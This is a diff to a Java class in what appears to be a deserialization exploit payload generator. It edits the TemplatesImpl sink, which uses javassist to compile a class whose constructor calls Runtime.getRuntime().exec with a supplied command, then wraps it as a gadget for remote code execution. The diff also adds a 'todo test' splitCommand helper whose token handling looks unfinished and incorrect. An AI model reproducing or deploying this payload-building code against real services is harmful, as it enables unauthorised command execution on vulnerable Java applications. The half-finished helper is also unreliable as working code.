@@ -10,6 +10,7 @@ import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.ClassFiles;
 import com.ppp.utils.Reflections;
 import com.ppp.utils.RemoteLoadD;
+import com.ppp.utils.Strings;
 import com.ppp.utils.maker.CryptoUtils;
 import com.ppp.utils.maker.JavaClassUtils;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -21,6 +22,7 @@ import javassist.CtField;
 
 import java.io.FileInputStream;
 import java.io.Serializable;
+import java.util.Arrays;
 
 /**
  * @author Whoopsunix
@@ -34,7 +36,7 @@ public class TemplatesImpl {
      * @return
      * @throws Exception
      */
-    @EnchantType({EnchantType.RUNTIME, EnchantType.DEFAULT})
+    @EnchantType({EnchantType.Command, EnchantType.DEFAULT})
     public Object runtime(SinksHelper sinksHelper) throws Exception {
         String className = "RuntimeD";
         String command = sinksHelper.getCommand();
@@ -45,6 +47,10 @@ public class TemplatesImpl {
         CtClass ctClass = pool.makeClass(className);
         CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
         ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
+
+        // todo test
+//        ctConstructor.setBody(String.format("{Runtime.getRuntime().exec(new String[]{%s});}", splitCommand(command)));
+
         ctClass.addConstructor(ctConstructor);
 
         // 设置 serialVersionUID
@@ -56,6 +62,27 @@ public class TemplatesImpl {
         return createTemplatesImpl(bytes);
     }
 
+
+    public static String splitCommand(String command) {
+        // 使用 String.split() 方法将字符串按空格划分
+        String[] parts = command.split("\\s+");
+
+        // 截取前三段，如果段数超过三段
+        int segments = Math.min(parts.length, 3);
+
+        // 构造结果字符串
+        StringBuilder resultBuilder = new StringBuilder();
+        for (int i = 0; i < segments; i++) {
+            if (i < segments - 1) {
+                resultBuilder.append("\"").append(parts[i]).append("\"").append(",");
+            }
+        }
+        for (int i = 2; i < parts.length; i++) {
+            resultBuilder.append(parts[i]).append(" ");
+        }
+
+        return resultBuilder.toString();
+    }
 
     /**
      * 线程延时
@@ -290,7 +317,7 @@ public class TemplatesImpl {
         return templates;
     }
 
-    public static byte[] createRandomNameClass() throws Exception{
+    public static byte[] createRandomNameClass() throws Exception {
 //        Printer.yellowInfo("_bytecodes[1] make");
         ClassPool classPool = ClassPool.getDefault();
         CtClass ctClass = classPool.makeClass("Whoopsunix");
